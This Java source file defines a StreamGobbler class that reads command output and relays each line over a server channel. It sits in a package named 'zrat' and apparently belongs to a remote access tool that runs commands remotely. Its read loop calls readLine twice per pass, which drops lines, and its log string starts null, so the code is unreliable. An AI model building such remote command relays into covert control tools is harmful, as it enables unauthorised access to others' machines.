package com.zrat.server.controller;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.TimerTask;

import com.zrat.server.Server;
import com.zrat.transfer.model.TransferDataStruct;

class StreamGobbler extends TimerTask {
      InputStream is;
      String type;
      String sInput;
      String sLog;
      StreamGobbler(InputStream is, String type) {
          this.is = is;
          this.type = type;
          this.sInput = "";
      }

      public String getInput() {
    	
        return sInput;
      }
      public String getLog() {
        return sLog;
      }

      public void run() {
          try {
              InputStreamReader isr = new InputStreamReader(is);
              BufferedReader br = new BufferedReader(isr);
              String line=null;
              while ( (line = br.readLine()) != null&&!"".equals(br.readLine())) {
                  sLog+=type + ">" + line+"<br>";
                  sInput += line;
                  sendMessges(line);
              }
//              is.close();
             
          }
          catch (IOException ioe){
              ioe.printStackTrace();
          }
      }
      
      public void sendMessges(String messge){
    	  TransferDataStruct data = new TransferDataStruct(CommandService.COMMAND_RUNCOMAND);
    	  data.setObject(messge);
    	  Server.getChannel().write(data);
      }
}